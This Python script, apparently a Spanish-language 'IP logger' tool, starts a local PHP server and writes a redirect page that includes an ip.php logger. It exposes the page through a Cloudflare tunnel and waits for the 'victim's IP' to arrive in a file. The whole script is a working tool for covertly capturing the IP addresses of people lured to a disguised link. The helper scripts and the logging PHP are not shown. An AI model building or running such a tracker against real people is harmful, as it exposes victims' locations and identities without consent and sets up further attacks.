#!/usr/bin/python3

import os
import time

logo = """\033[33m
  _____ _____  _      ____   _____  _____ ______ _____  
 |_   _|  __ \| |    / __ \ / ____|/ ____|  ____|  __ \ 
   | | | |__) | |   | |  | | |  __| |  __| |__  | |__) |
   | | |  ___/| |   | |  | | | |_ | | |_ |  __| |  _  / 
  _| |_| |    | |___| |__| | |__| | |__| | |____| | \ \ 
 |_____|_|    |______\____/ \_____|\_____|______|_|  \_\\

                  By: Euronymou5
"""

def check():
    while True:
        if os.path.isfile('ip.txt'):
          print(' ')
          print('\n\033[94m[~] IP de la victima encontrado!')
          with open('ip.txt') as ip:
            lines = ip.read().rstrip()
            if len(lines) != 0:
                print(' ')
                os.system("cat ip.txt")
                os.system("rm -rf ip.txt")
          ip.close()

def server():
    os.system("clear")
    print(logo)
    print('[~] Iniciando servidor php...')
    var1 = input('\n[~] ¿Quieres utilizar la pagina por default? (Error 404 HTML) [Y/n]: ')
    if var1 == "y" or var1 == "Y":
      file = open('index.php', 'r+')
      ler = file.read()
      file.close()
      if "index.html" in ler:
        pass
      else:
        global file2
        os.system("rm index.php && touch index.php")
        file2 = open('index.php', 'w')
        file2.write("""<?php
include 'ip.php';
header('Location: index.html');
exit();
?>""")
        file2.close()
      print('\n[~] Utilizando el puerto: 8080')
      print('\n[~] Creando link...')
      os.system("php -S localhost:8080 > /dev/null 2>&1 &")
      os.system("bash modules/launch.sh")
      print('\n[~] Esperando datos...')
      check()
    elif var1 == "n" or var1 == "N":
      link = input('\n[~] Ingresa el link para redirigir a la victima (e.j: https://youtube.com): ')      
      file = open('index.php', 'w')
      file.write("""<?php
include 'ip.php';
header('Location: index.html');
exit();
?>""".replace("index.html", link))
      file.close()     
      print('\n[~] Utilizando el puerto: 8080')
      print('\n[~] Creando link...')
      os.system("php -S localhost:8080 > /dev/null 2>&1 &")
      os.system("bash modules/launch.sh")
      print('\n[~] Esperando datos...')
      check()

def menu():
  if os.path.isfile('server/cloudflared'):
     pass
  else:
    print('\n\033[31m[!] Cloudflare no esta instalado.')
    print('\n\033[35m[~] Instalando cloudflare...')
    os.system("bash modules/install.sh")
  if os.path.isfile('server/.cld.log'):
    os.system("rm server/.cld.log")
  else:
    pass
  os.system("killall php")
  os.system("clear")
  print(logo)
  print('\n[1] Iniciar servidor php')
  print('[99] Salir')
  T = int(input('\n>> '))
  if  T == 1:
      server()
  elif T == 99:
      exit()
  else:
     print('\n[!] Error opcion invalida.')
     time.sleep(2)
     menu()
        
        
menu()
